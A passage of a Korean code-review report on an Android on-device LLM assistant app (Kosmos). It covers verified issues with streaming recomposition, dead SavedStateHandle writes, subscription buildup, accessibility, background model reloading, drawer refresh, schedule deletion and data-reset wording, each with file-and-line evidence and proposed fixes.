- 왜: 0.41.9 에서 말풍선 갱신을 묶어 느린 프레임이 크게 줄었지만(기록상 369/624 → 56/109, 엄밀 비교 아님) 여전히 절반가량이 느린 프레임이었다. 남은 몫 중 일부는 토큰마다 화면 본문 전체가 다시 도는 구조에서 온다고 추정한다(측정하지 않음). 발열이 중요한 기기 추론 앱이라 메인 스레드 낭비는 체감·배터리 양쪽에 걸린다. 다만 큰 멈춤의 주원인은 GPU 점유라는 기록이 있어 우선순위는 낮다.
- 제안: 스트리밍 글을 ChatUiState 에서 떼어 별도 StateFlow(streaming: 글·생각)로 두고, ViewModel 쪽에서 50ms 로 묶어(sample/conflate) 내보낸다. ChatScreen 은 그 값을 목록의 스트리밍 항목 안에서만 읽는다(collectAsStateWithLifecycle 을 item 안으로). 그러면 토큰이 와도 상단바·입력바·다른 행은 다시 돌지 않는다. isInFlight·'첫 토큰 전인가'처럼 화면 틀이 필요한 것은 불리언으로만 uiState 에 남긴다. 바꾸기 전후를 에뮬레이터 gfxinfo 로 같은 질문에 대해 비교하고, 차이가 없으면 되돌린다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:514-529 — 스트림 콜백마다 _uiState.update(streamingText/streamingThinking)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:125 — ChatScreen 최상단에서 uiState 전체를 읽음 → 토큰마다 Scaffold·상단바·입력바 람다·LazyColumn 내용 람다가 다시 만들어짐
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:605-615 — 묶음(rememberStreamingText)은 말풍선의 마크다운 글에만 적용
  - app/src/main/java/com/kosmos/app/feature/chat/ChatScreen.kt:469 — 생각 과정(streamingThinking)은 묶지 않고 그대로 전달
  - app/src/main/java/com/kosmos/app/feature/chat/ChatBubbles.kt (SyncMarkdown) — 50ms 마다 답 전체를 처음부터 다시 파싱(답이 길수록 한 번의 비용이 커짐)
- 검증: 구조는 맞다: ChatViewModel.kt:514-529 스트림 콜백마다 _uiState.update, ChatScreen.kt:125 최상단에서 uiState 전체 수집, :605-615 50ms 묶음은 말풍선 글에만, :469 streamingThinking 은 묶지 않음. 그러나 '상단바·입력바 람다·모든 행이 토큰마다 다시 만들어진다'는 과장이다 — Kotlin 2.4.21(gradle/libs.versions.toml:3)은 Compose 강한 건너뛰기가 기본이라 람다가 자동 기억되고, 인자가 안 바뀐 CustomChatHeader·ChatInputBar·TimelineRow 는 건너뛴다(스트리밍 중 chipsFor 는 emptyList 를 돌려줌, ChatScreen.kt:413-415). 실제로 토큰마다 도는 것은 ChatScreen 본문 자체와 LazyColumn 내용 람다 재평가 정도이며 비용은 측정된 적이 없다(제안자도 추정이라 밝힘). 0.41.9 기록은 남은 끊김의 큰 몫을 GPU 점유로 보고 추가 미세 최적화를 하지 않기로 했다. 근거 없이 구조를 바꾸기보다, 한다면 에뮬레이터 gfxinfo 전후 비교가 선행돼야 하고 우선순위는 낮다. 생각 과정(streamingThinking)만 같은 50ms 묶음에 넣는 것은 한 줄짜리 변경으로 따로 할 수 있다.
- 앞선 기록: CHANGELOG 0.41.9 '[Perf] 스트리밍 말풍선 갱신 묶기' — 큰 멈춤은 모델의 GPU 점유 대기라 같은 분석의 나머지는 하지 않기로(사용자 결정). CHANGELOG 265줄: 외부 분석 대조에서 '`Map` 리컴포지션(작음)' 기각

### chatui-7 · SavedStateHandle 은 세션 id 를 쓰기만 하고 읽지 않는다 — 설계 문서는 '이것으로 복원한다'고 적혀 있다
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 프로세스가 죽었다 살아날 때 무엇이 복원되는지는 면접 단골 질문인데, 코드에는 SavedStateHandle 이 주입돼 있어 '복원한다'처럼 보이지만 실제로는 아무것도 복원하지 않는다(세션 id 는 DataStore 가 진실). 문서와 코드가 어긋난 채 남아 있으면 설명할 때 틀린 말을 하게 된다. 정작 복원이 필요한 값(쓰던 글, chatui-2)은 저장되지 않는다.
- 제안: 쓰기 한 줄과 상수를 지우고, ChatViewModel 생성자에서 SavedStateHandle 을 빼거나(E2E 생성부 3곳 수정 필요) chatui-2 를 ViewModel 쪽에서 풀 생각이면 그 용도로 실제 사용한다. architecture.md 해당 세 곳을 '세션 id 는 SessionStore 가 단일 출처, 화면 상태는 rememberSaveable' 로 고친다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:197 — savedStateHandle[KEY_SESSION_ID] = sessionId (유일한 사용처)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:732 — KEY_SESSION_ID 상수, 저장소 전체 grep 결과 읽는 곳 없음
  - app/src/main/java/com/kosmos/app/feature/chat/ChatViewModel.kt:190-196 — 실제 복원은 SessionStore(DataStore) 흐름으로만 함
  - docs/architecture.md:521, :741, :907-917 — 'ChatViewModel 은 SavedStateHandle + SessionStore 로 sessionId 를 복원한다'와 예시 코드
- 검증: 저장소 전체 grep(app·domain·data·core, build 제외): savedStateHandle 사용은 ChatViewModel.kt:71(주입)·:197(쓰기) 뿐이고 KEY_SESSION_ID 는 :197·:732 뿐 — 읽는 곳이 없다. 실제 복원은 :190-196 sessionStore.activeSessionIdFlow. architecture.md:521 'SavedStateHandle + 필요 시 SessionStore 를 통해 sessionId 를 복원', :741 흐름도, :907-917 예시 코드(savedStateHandle["session_id"] 읽기)는 지금 코드와 다르다. 동작에는 영향 없는 죽은 쓰기 + 문서 불일치. 생성자에서 빼면 테스트 손 생성부 5곳(ScreenCatalogTest:407, ChatSpeechIntegrationTest:133, MultimodalChatE2ETest:130, ToolApprovalE2ETest:164, VoiceChatIntegrationTest:119)을 고쳐야 한다(제안의 '3곳'은 틀림 — 생성부 수정은 AGENTS 2-② 허용 범위). 문서만 고치고 쓰기 한 줄·상수만 지우는 것이 가장 싸다.
- 앞선 기록: docs/architecture.md:521·741·907-917 — 초기 설계 서술(SavedStateHandle 로 sessionId 복원)이 그대로 남음. CHANGELOG 에 관련 기록 없음

### chatui-8 · 결과 카드 구독이 화면이 살아 있는 동안 계속 쌓인다 (지나간 카드도 해제되지 않음)
- 판정 확인됨 · 중요도 낮음 · 크기 S
- 왜: 채팅이 루트 화면이라 이 ViewModel 은 Activity 가 살아 있는 내내 유지된다. 과거 대화를 길게 올려 보면 지나간 알림·일정 카드마다 Room 구독이 하나씩 남고, 이후 할 일 테이블에 쓰기가 한 번 일어날 때마다(알림 울림·미룸·새 등록) 그 수만큼 조회가 다시 돈다. 자정이 지나면 전부 취소하고 전부 다시 구독한다. 매일 쓰며 카드가 수백 개 쌓인 뒤 긴 스크롤을 하면 체감될 수 있다. 지금 당장의 결함은 아니고 사용량이 늘면 드러나는 종류다.
- 제안: 구독 수에 상한을 둔다: 지켜보는 키를 최근 사용 순으로 관리해 일정 수(예: 화면 두세 장 분량)를 넘으면 가장 오래된 구독을 취소하고 마지막 상태만 results 에 남긴다(다시 보이면 ensure 가 재구독). 또는 행이 화면에서 사라질 때 해제 신호를 받는 방식(TimelineRow 의 DisposableEffect → release(key), 짧은 유예 뒤 취소). 단위 테스트: 상한을 넘겨 ensure 하면 활성 구독 수가 상한 이하.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/result/ChatExtrasViewModel.kt:122 — 키마다 한 번 구독
  - app/src/main/java/com/kosmos/app/feature/chat/result/ChatExtrasViewModel.kt:137 — watchJobs += job, 취소는 언어 변경(:77)·날짜 변경(:110) 때뿐
  - data/src/main/java/com/kosmos/app/data/local/db/dao/TaskDao.kt:43-44 — 알림·일정 카드는 Room Flow(SELECT ... WHERE id) 라 task_item 테이블이 바뀔 때마다 구독 수만큼 다시 조회
  - app/src/main/java/com/kosmos/app/feature/chat/ChatTimeline.kt:81 — 행이 화면에 보일 때마다 onEnsureResult 호출(과거로 스크롤하면 계속 늘어남)
- 검증: ChatExtrasViewModel.kt:122 키마다 한 번 구독, :127-137 viewModelScope.launch 한 job 을 watchJobs 에 추가, 취소는 :77(언어 변경)·:110(날짜 변경) 뿐 — 행이 화면에서 사라져도 해제 경로가 없다. ChatTimeline.kt:81 `LaunchedEffect(result) { onEnsureResult(result) }` 로 보이는 행마다 호출. 알림·일정 카드는 :141·:145 taskRepository.observeById → TaskDao.kt:44 Room Flow 라 테이블 쓰기마다 구독 수만큼 재조회된다. ViewModel 은 채팅 내비게이션 항목 범위(AppNavHost.kt:105-106 hiltViewModel)라 루트가 살아 있는 내내 유지. 주장은 맞지만 영향은 작다: 단건 PK 조회이고 과거로 길게 스크롤해 알림·일정 카드를 수백 개 지나야 체감될 정도이며 측정된 문제는 아니다. 완료된 일회성 흐름의 job 도 목록에 남지만 무해. 실사용에서 느려짐이 관찰되면 그때 상한을 두는 정도로 충분 — 지금은 후순위.
- 앞선 기록: CHANGELOG 0.40.2 검토 후속(구독의 화면 Context 누수 수정)·M3-10(자정 뒤 재구독). 구독 수 상한에 대한 기록 없음

### chatui-9 · 작은 누름 영역·고정 높이·설명 없는 길게 누르기 등 접근성 잔여 항목
- 판정 일부만 맞음 · 중요도 낮음 · 크기 S
- 왜: 0.38.x 점검에서 주요 버튼의 누름 영역(48dp)은 맞췄지만 뒤에 추가된 요소 몇 개가 빠져 있다. Compose 가 작은 요소의 터치 판정은 넓혀 주므로 실제 누르기는 되지만, 화면 읽기(TalkBack) 사용자는 말풍선마다 의미 없는 '두 번 탭하여 활성화'를 듣고, 복사 기능은 안내가 없어 찾을 수 없다. 글자를 크게 쓰는 설정에서 요약 줄이 잘리는지는 화면으로 확인하지 않았다(추정). 포트폴리오에서 접근성을 강점으로 말하려면 정리해 둘 가치가 있다.
- 제안: ① 예시 버튼·답 칩에 Modifier.minimumInteractiveComponentSize() 추가(보이는 크기는 그대로). ② 요약 줄을 height(44dp) 대신 heightIn(min = 48dp) 로, 라벨에 maxLines = 1 + 말줄임. ③ 말풍선의 combinedClickable 에 onLongClickLabel = '복사'(한/영 리소스) 를 주고, 눌러도 할 일이 없는 말풍선은 onClick 을 의미 없는 클릭으로 알리지 않게 pointerInput(detectTapGestures(onLongPress)) + semantics 의 사용자 지정 동작(customActions '복사')으로 바꾼다. ④ 시스템 글자 1.3배·2배에서 요약 줄·승인 시트를 에뮬레이터로 한 번 확인해 device_gate 목록에 적는다. E2E 계약 문자열("Attach"/"Send"/"Document Attached")은 건드리지 않는다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/chat/ChatTimeline.kt:192 — 요약 줄 높이 44dp 고정(48dp 미만), 세 칸의 라벨 글자에 줄 수 제한·넘침 처리 없음 → 시스템 글자 확대 시 잘릴 수 있음
  - app/src/main/java/com/kosmos/app/feature/chat/EmptyChat.kt:77 — 첫 화면 예시 버튼이 세로 여백 9dp(약 38dp 높이), minimumInteractiveComponentSize 없음
  - app/src/main/java/com/kosmos/app/feature/chat/ChatBubbles.kt:408 — 답 칩 세로 여백 8dp(약 36dp), 같은 문제
  - app/src/main/java/com/kosmos/app/feature/chat/ChatBubbles.kt:111, :256 및 BriefingCard.kt:55 — combinedClickable(onClick = {}) 로 일반 말풍선이 '누를 수 있음'으로 읽히지만 눌러도 아무 일 없음, 길게 눌러 복사에 onLongClickLabel 없음
  - app/src/main/java/com/kosmos/app/feature/chat/ChatBubbles.kt:109, :203 — 말풍선 최대 폭 280/340dp 고정(가로 화면·큰 글자에서 좁음)
  - app/src/main/java/com/kosmos/app/feature/chat/ChatInputBar.kt:114 — "KB" 표기가 문자열 리소스가 아닌 코드 안 조립
- 검증: 확인된 것: ChatTimeline.kt:192 요약 줄 `.height(44.dp)` 고정, 각 칸은 :241 fillMaxHeight 라 누름 높이 44dp. EmptyChat.kt:76-77 예시 버튼 세로 여백 9dp + minimumInteractiveComponentSize 없음. ChatBubbles.kt:407-408 답 칩 세로 여백 8dp, 같은 상태(같은 파일 :328 과 ChatHeader.kt:137 에는 이미 적용돼 있어 누락으로 보임). ChatBubbles.kt:256·BriefingCard.kt:55 `combinedClickable(onClick = {}, onLongClick = onLongPress)` — 빈 클릭 + onLongClickLabel 없음(저장소 전체에 onLongClickLabel 사용처 0). ChatBubbles.kt:109 280dp, :203 280/340dp 고정. ChatInputBar.kt:114 "KB" 코드 조립.
틀리거나 약한 것: ① '세 칸 라벨에 줄 수 제한 없음' — 값 글자에는 maxLines = 1 이 있다(ChatTimeline.kt:254), 없는 것은 라벨(:252)과 말줄임 처리뿐. ② ChatBubbles.kt:111 사용자 말풍선은 첨부 문서일 때 onClick 이 펼치기라 '눌러도 아무 일 없음'은 일반 글 말풍선에만 해당. ③ 말풍선 최대 폭 고정은 채팅 앱의 통상 설계이고 :203 주석에 의도가 적혀 있어 결함으로 보기 어렵다. ④ "KB" 는 단위 표기라 번역 대상이 아님. ⑤ 큰 글자에서 요약 줄이 잘리는지는 제안자도 화면으로 확인하지 않음. 실제로 남길 것은 예시 버튼·답 칩의 최소 누름 크기, 요약 줄 heightIn(min = 48dp)+라벨 말줄임, 말풍선 길게 누르기 라벨(문자열은 한/영 함께 — MissingTranslation 오류 등급) 세 가지. 화면 구조 변경이 아니므로 작업량은 작다.
- 앞선 기록: CHANGELOG 0.38.3 M0·M6(누름 영역 48dp·화면 읽기 상태 안내), 0.38.6 M6(보내기·마이크 48dp). 아래 요소들을 일부러 둔 기록은 없음

<details><summary>읽은 범위</summary>

직접 전부 읽은 파일: feature/chat 의 ChatViewModel·ChatScreen·ChatUiState·ChatInputBar·ChatTimeline·ChatBubbles·ChatHeader·ChatSearchMenu·EmptyChat·BriefingCard·WebSearchViewModel, feature/chat/result 의 ChatExtrasViewModel·ChatChips·DocSourceViewModel, feature/approval/ApprovalSheet, ui/MainScreen, ui/paging 3개, ui/component 중 KosmosBottomSheet·KosmosButton·KosmosIcon·KosmosSurface·KosmosTextField·KosmosTopBar·MotionModifiers·ReducedMotion·RememberToday·SheetHeader·KosmosSegmentedControl, ui/theme 중 Type·Theme·ThemeViewModel·WindowNightMode. 범위 밖이지만 근거 확인용으로 일부만 본 것: AssistantOrchestrator(메시지 저장부), AppNavHost(채팅 항목), ApprovalCoordinator·StartupCoordinator·VoiceLaunchHandler(grep), ConversationDao·TaskDao 쿼리, AndroidManifest, DataResetViewModel.
읽지 못한 것: feature/chat/result 의 ReminderEditSheet·ReminderEditor·ResultCard, ui/component 의 KosmosList·TwinkleStars, ui/theme 의 Color·Motion·Shape — 시간상 열지 않았다(이 파일들에 대한 항목은 없음). 그래프 도구는 쓰지 않고 grep·직접 읽기만 했다. gradle·adb·테스트는 실행하지 않았으므로 모든 항목은 코드 읽기 근거이며, chatui-1 의 위젯 음성 진입 시점과 chatui-6 의 성능 영향, chatui-9 의 글자 확대 잘림은 실측하지 않은 추정이다.
확인 결과 문제 아님으로 정리한 것: 범위 안 하드코딩 색(Color(0x…))·직접 fontSize·이모지 아이콘은 grep 으로 0건(ChatHeader 의 letterSpacing 1.sp 한 곳만 있음, 크기 지정은 아님). 대화 초기화 뒤 페이징 캐시가 남는 문제는 초기화가 앱 재시작을 강제해 해당 없음. 같은 시각으로 저장되는 사용자 글·문서 블록의 페이징 순서는 createdAt 인덱스가 있어 타임라인에서는 안정적(다만 세션별 최근 조회 getRecentBySession 은 동률 순서가 정해져 있지 않아 모델 문맥에서 두 행의 순서가 바뀔 여지가 있음 — 데이터 영역 담당이 볼 것).
10건 안에 넣지 않고 버린 것 4건: ① 이미지 읽기 실패를 AppError.UnsupportedImageFormat 의 mimeType 칸에 한국어 문장으로 넣는 것(ChatViewModel:426) — 사용자에게는 '지원하지 않는 형식'류로 보여 원인이 어긋나지만 영향이 작다. ② 음성 턴 직후 loadMessages 결과가 늦게 도착하면 그 사이 새로 보낸 임시 말풍선을 덮어쓸 수 있는 경합 — 창이 수 ms 라 재현 가능성이 낮다. ③ 스트리밍 말풍선이 끝나며 키가 'streaming'에서 메시지 id 로 바뀌어 펼쳐 둔 생각 과정이 접히는 것 — 사소함. ④ ApprovalSheetContent 의 기본 버튼 글자 '취소'/'승인' 하드코딩 — 모든 생성 경로가 리소스로 덮어써 실제 노출 없음.

</details>

## 그 밖의 화면 (screens)

### screens-1 · 시작 화면이 떠 있는 동안 앱을 내리면 모델이 백그라운드에서 다시 올라간다
- 판정 확인됨 · 중요도 높음 · 크기 S
- 왜: 앱을 열고 로딩 중에 다른 앱으로 넘어가면(알림 확인 등 실사용에서 흔함) 해제 → FileFound → 시작 화면 뷰모델이 즉시 다시 로드하는 순서가 된다. 화면 쪽 상태 수집은 멈춰 있어 채팅으로 넘어가지도 않으므로 뷰모델이 계속 살아 있고, 약 3.6GB 가 백그라운드에 올라간 채 남는다. 이후 메모리 정리 신호가 올 때마다 해제와 재로드가 되풀이될 수 있어 발열·배터리·다른 앱 종료로 이어진다. AGENTS 2-6 '백그라운드에서 모델을 로드하지 않는다'를 정면으로 어기는 경로라 포트폴리오 설명(수명주기 설계)에서도 약점이다. 코드 경로는 세 파일을 읽어 확인했고 실기기 재현은 하지 않았다.
- 제안: 시작 화면의 자동 로드를 화면이 보일 때만 돌게 한다. (가) SplashViewModel 의 init 구독을 없애고 SplashScreen 에서 collectAsStateWithLifecycle 로 받은 loadState 가 FileFound 일 때 LaunchedEffect 로 warmUp 을 부르거나, (나) 구독을 유지하되 ProcessLifecycleOwner 가 STARTED 이상일 때만 warmUp 하도록 조건을 건다. 전경 복귀 때의 로드는 이미 MainActivity 의 ModelWarmUpObserver.onStart 가 맡고 있어 겹치지 않는다. 단위 테스트: 'close 뒤 FileFound 가 와도 화면이 멈춰 있으면 warmUp 0회'. 에뮬레이터에서 로딩 중 홈 버튼 → logcat 의 엔진 초기화 로그로 확인.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/splash/SplashViewModel.kt:27-35 — init 에서 viewModelScope 로 loadState 를 계속 구독하고, FileFound 가 오면 화면이 보이는지와 무관하게 modelRunner.warmUp() 을 부른다
  - app/src/main/java/com/kosmos/app/KosmosApp.kt:102-106, 119-123 — 앱이 백그라운드로 가거나 메모리 정리 신호가 오면 modelRunner.close()
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaModelRunner.kt:539-556 — close() 는 엔진을 닫은 뒤 checkModelFile() 로 상태를 FileFound 로 되돌린다
  - app/src/main/java/com/kosmos/app/runtime/gemma/GemmaRuntimeManager.kt:76 — FileFound 에 현재 시각이 들어가 매번 새 값으로 방출된다
  - app/src/main/java/com/kosmos/app/navigation/AppNavHost.kt:94-110 — 채팅으로 넘어가기 전(로드 9~12초 + 시작 단계)과 모델 내려받기 화면이 위에 있는 동안 시작 화면 항목(뷰모델)이 살아 있다
- 검증: 직접 읽음: SplashViewModel.kt:27-35(init 에서 viewModelScope 로 loadState 수집, FileFound 면 조건 없이 warmUp) / KosmosApp.kt:102-106·119-123(onStop·onTrimMemory 에서 close) / GemmaModelRunner.kt:539-556(close 가 엔진 해제 뒤 checkModelFile) / GemmaRuntimeManager.kt:76-84(FileFound 에 lastLoadedAt=현재 시각 → 매번 다른 값이라 StateFlow 가 다시 방출) / GemmaModelRunner.kt:559-581(warmUp 에 전경 여부 검사 없음) / SplashScreen.kt:50-51(화면 쪽은 collectAsStateWithLifecycle 이라 멈춰 있어 채팅으로 넘어가지 않음 → 시작 화면 항목과 뷰모델이 살아 있음) / AppNavHost.kt:79-95. 막는 가드를 찾지 못했다. 성립 창: 엔진 로드 중, Ready 뒤 시작 단계가 도는 중, 모델 내려받기 화면이 시작 화면 위에 있는 동안. 로드 도중에 내리면 close 가 뮤텍스를 기다렸다가 해제 → FileFound → 곧바로 재로드. 이후 onTrimMemory 가 올 때마다 해제·재로드가 되풀이될 수 있다는 주장도 코드상 성립. 보충: 로드 직후 setReady(메인)와 close 의 FileFound(LLM 디스패처) 순서가 경합이라, Ready 가 나중에 쓰이면 '엔진 없는 Ready'가 남는 별도 경로도 있다. SplashViewModel 단위 테스트는 없음(ScreenCatalogTest 에서만 생성). 실기기 재현은 하지 않음
- 앞선 기록: CHANGELOG 1157-1164행(0.16.1~0.16.2 대) — close() 가 상태를 FileFound 로 되돌리게 한 것과 'FileFound 를 보면 warmUp' 반응을 앱 수명주기로 옮긴 기록. 그때 시작 화면 뷰모델의 구독은 콜드 스타트용으로 남겼고, 그것이 백그라운드에서 다시 올리는 경로는 기록 없음. CHANGELOG 963행(0.27.x M1)은 runTurn 쪽 백그라운드 재로드만 막음

### screens-2 · 드로어의 '지난 대화' 목록이 앱을 다시 켜기 전까지 새로 고쳐지지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 대화가 정리돼 새 요약(에피소드)이 생겨도 드로어 목록은 앱 시작 때 읽은 그대로다. 휴대폰에서 매일 쓰면 액티비티가 며칠씩 살아 있으므로 '대화가 쌓이면 주제별로 정리돼 여기 보여요'라는 안내와 달리 새 대화가 보이지 않는다. 설정의 기억 정리로 대화를 합친 뒤에는 이미 없어진 항목이 남아, 누르면 '이 대화 요약은 지웠어요'가 뜬다. 기억 아카이브는 이 앱의 핵심 기능이라 실사용 첫 주에 바로 눈에 띈다.
- 제안: 드로어가 열릴 때 목록을 다시 읽는다. MainScreen 에서 drawerState 가 열림으로 바뀌는 순간(snapshotFlow { drawerState.targetValue })을 AppDrawerContent 에 신호로 내려 episodes.refresh() 와 viewModel.onEpisodesChanged()(검색 결과 재계산)를 부른다. 더 근본적으로는 EpisodeRepository 에 변경 관찰 Flow(행 수·최근 수정 시각)를 두고 DrawerViewModel 이 그것으로 PagingSource 를 무효화하면 기억 정리·요약 완료가 자동 반영된다. Robolectric 테스트: 요약 저장 후 드로어를 열면 새 항목이 보인다.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/drawer/DrawerViewModel.kt:60-65 — 목록은 스스로 무효화하지 않는 DefaultPagingSource 를 cachedIn(viewModelScope) 로 한 번 읽어 붙든다
  - app/src/main/java/com/kosmos/app/ui/MainScreen.kt:79-95 — 드로어 내용은 NavHost 밖(액티비티 범위)이라 DrawerViewModel 이 액티비티가 살아 있는 내내 같은 인스턴스다
  - app/src/main/java/com/kosmos/app/feature/drawer/AppDrawerContent.kt:68, 173-176 — refresh 는 대화 요약 시트에서 수정·삭제가 성공했을 때만 불린다. 드로어를 열 때는 부르지 않는다
  - app/src/main/java/com/kosmos/app/ui/paging/DefaultPagingSource.kt:14-42 — invalidate 를 부르는 곳이 없다
- 검증: 직접 읽음: DrawerViewModel.kt:60-65(Pager + DefaultPagingSource, cachedIn(viewModelScope)) / DefaultPagingSource.kt 전체(invalidate 없음, 저장소 전체 grep 에서도 invalidate() 호출 0건) / MainScreen.kt:79-95(AppDrawerContent 가 NavHost 밖, hiltViewModel 이 액티비티 범위) / AppDrawerContent.kt:68·173-176(refresh 는 시트의 onChanged 에서만, 드로어 열림에 묶인 효과 없음) / EpisodeDao.kt:33(SUMMARIZED 만 최신순). 주장보다 더 나쁜 점: 드로어 내용은 액티비티가 만들어질 때 바로 구성돼 첫 쪽을 읽는데, 지난 대화 요약은 그 뒤(엔진 Ready 후 시작 단계)에 끝나므로 콜드 스타트에서도 방금 요약된 대화는 다음 실행까지 목록에 없다. 검색 결과(searchResults)는 매번 새로 읽어 영향 없음. 데이터 손실은 아니고 표시가 낡는 것이라 medium 으로 낮춤
- 앞선 기록: CHANGELOG 937행 — '에피소드 수정·삭제 즉시 드로어 반영'만 확인한 기록. 새 요약이 생겼을 때의 갱신은 기록 없음

### screens-3 · 앱에 저장한 일정을 지우거나 고칠 방법이 화면 어디에도 없다
- 판정 확인됨 · 중요도 높음 · 크기 M
- 왜: 모델이 시간을 잘못 잡았거나 약속이 취소되면 앱 안에서는 손쓸 수 없다. 기기 캘린더 앱에서 지워도 앱 DB 의 사본은 남아 일정 화면·아침 브리핑·일정 조회 답에 계속 나오고, 캘린더 앱에서 시간을 고치면 제목·시각 짝이 달라져 같은 일정이 두 줄로 보인다. 현재 유일한 출구는 설정의 데이터 초기화에서 '할 일'을 통째로 지우는 것이다. 매일 쓰는 단계에서 가장 먼저 걸릴 빈틈이다.
- 제안: 일정 화면에서 앱 출처 일정 줄을 누르면 작은 시트(제목·시각, [지우기])를 띄운다 — 알림 수정 시트(ReminderEditSheet)와 같은 문법, 지운 뒤 되돌리기 스낵바. CalendarViewModel 에 deleteSchedule(taskId) → taskRepository.delete + 위젯 갱신 + 재조회를 둔다. 기기 캘린더 사본은 지금 insert 가 돌려주는 이벤트 id 를 버리고 있으므로(AddScheduleUseCase 49행), 1단계는 '기기 캘린더에 들어간 것은 캘린더 앱에서 지워 주세요' 안내로 두고 2단계에서 id 를 저장해 함께 지운다. 모델 도구는 건드리지 않으므로 토큰 실측이 필요 없다. 계획 단계에서 사용자에게 물을 것: 시각 수정까지 넣을지, 지우기만 둘지.
- 근거:
  - app/src/main/java/com/kosmos/app/feature/calendar/CalendarScreen.kt:178-180 — 오늘 탭에서 누를 수 있는 줄은 알림뿐이고 일정 줄은 onClick 이 null
  - app/src/main/java/com/kosmos/app/feature/calendar/MonthCalendar.kt:322-328 — 월 탭 선택한 날의 일정 줄도 onClick 없이 그린다
  - data/src/main/java/com/kosmos/app/data/local/db/dao/TaskDao.kt:23-36 — 메모·할 일 화면의 목록·삭제는 일정(dueDateIso 있는 행)을 일부러 뺀다
  - domain/src/main/java/com/kosmos/app/domain/usecase/AddScheduleUseCase.kt:38-52 — 일정은 앱 DB 와 기기 캘린더 양쪽에 따로 들어간다
  - domain/src/main/java/com/kosmos/app/domain/usecase/GetTodayScheduleUseCase.kt:136-139 — 두 곳의 같은 일정은 (제목, 시작 시각)이 같을 때만 하나로 본다
  - docs/CHANGELOG.md:89 — 모델 쪽에도 지우기 도구가 없다
- 검증: 직접 읽음: CalendarScreen.kt:178-180(알림 줄만 onClick, 일정 줄은 null) · 196-198(다가오는 일정 줄도 누름 없음) / MonthCalendar.kt:320-327(ScheduleRow 에 onClick 없음) / TaskDao.kt:23-36(할 일 목록·완료 삭제는 dueDateIso IS NULL 만) / AddScheduleUseCase.kt:37-52(task_item 저장 뒤 기기 캘린더에 따로 넣음) / GetTodayScheduleUseCase.kt:136-139((제목, 시작 시각) 일치로만 중복 제거). CalendarViewModel 에 일정 삭제 함수 없음(60-125행). 캘린더 앱에서 지워도 앱 사본이 남고, 시각을 고치면 두 줄이 된다는 추론은 중복 제거 식에서 그대로 따라 나온다. 잘못 들어간 일정이 아침 브리핑·일정 조회 답에도 계속 실리므로 매일 쓰는 단계에서 무게가 크다. 계획 단계에서 사용자에게 범위(지우기만/수정 포함)를 물어야 하는 큰 작업
- 앞선 기록: CHANGELOG 89행(0.42.6 측정표 E)·docs/plans/0.42.6-multi-step-measure.md 19행 — 모델에 지우기 도구가 없다는 사실만. docs/checklists/real_use_start.md·plans/0.42.10 21행은 시험 일정을 기기 캘린더 앱에서 손으로 지우라고 안내. 화면에 지우기를 두지 않기로 한 결정 기록은 없음

### screens-4 · 데이터 초기화의 '할 일' 문구가 일정까지 지운다는 사실을 말하지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 S
- 왜: 0.42.10 에서 고친 '없는 기능을 권하는 문구'와 같은 종류의, 화면 문구와 실제 동작의 불일치다. 이 대화상자는 닫으면 되돌릴 수 없는 삭제의 범위 설명이 전부인데, '할 일'만 고른 사용자는 앱에 저장한 일정 전부가 함께 사라진다는 것을 모른다. 실사용 시작 절차가 바로 이 초기화를 쓰므로 지금 고칠 값이 있다. 반대로 기기 캘린더에 들어간 사본은 남는다는 점도 화면에는 없다.
- 제안: 문구만 고친다(한·영 함께). 제목 '할 일·일정', 설명 '완료한 것 포함, 예약된 알림도 취소. 기기 캘린더에 들어간 일정은 그대로'. 요약 줄은 '대화 기록, 할 일·일정, 메모, 프로필, 문서 보관함 중 골라서 지워요'. USER_GUIDE 한·영의 초기화 설명도 같이 맞춘다. 문자열 변경이라 기존 단언을 건드리는지 먼저 grep 으로 확인.
- 근거:
  - app/src/main/res/values/strings.xml:470-471 — '할 일 / 완료한 것 포함, 예약된 알림도 취소' (영어 values-en/strings.xml:468 도 같은 뜻)
  - data/src/main/java/com/kosmos/app/data/local/repository/DataResetRepositoryImpl.kt:37 — TASKS 는 task_item 표를 통째로 지운다
  - domain/src/main/java/com/kosmos/app/domain/usecase/AddScheduleUseCase.kt:38-45 — 앱 일정도 task_item 의 한 행(dueDateIso)이다
  - app/src/main/res/values/strings.xml:467 — 요약 문구 '대화 기록, 할 일, 메모, 프로필 중 골라서'에 다섯째 항목인 문서 보관함이 빠져 있다
  - docs/checklists/real_use_start.md:12 — 점검표는 '할 일 = 할 일·일정·알림'이라고 적고 있다
- 검증: 직접 읽음: values/strings.xml:467('대화 기록, 할 일, 메모, 프로필 중 골라서' — 문서 보관함 누락) · 470-471('할 일 / 완료한 것 포함, 예약된 알림도 취소') · 474-475(문서 보관함 항목은 실제로 있음) / values-en/strings.xml 같은 줄(같은 뜻) / DataResetRepositoryImpl.kt:35-37(TASKS → task_item 통째) / AddScheduleUseCase.kt:38-45(일정도 task_item 행). 되돌릴 수 없는 삭제의 범위 설명이 실제보다 좁다. 문구만 고치면 되는 일이지만 한·영·사용 안내를 함께 고쳐야 하고, 문자열을 단언하는 테스트(EnglishModeUiTest·ScreenCatalogTest 가 DataReset 을 참조)가 있는지 먼저 확인할 것
- 앞선 기록: docs/checklists/real_use_start.md 표('할 일 = 할 일·일정·알림', '보관함' 행 포함) — 문서는 범위를 알고 있고 화면 문구만 옛 그대로

### screens-5 · 같은 문서가 뷰어에 이미 열려 있으면 출처 카드가 가리키는 위치로 가지 않는다
- 판정 확인됨 · 중요도 중간 · 크기 S
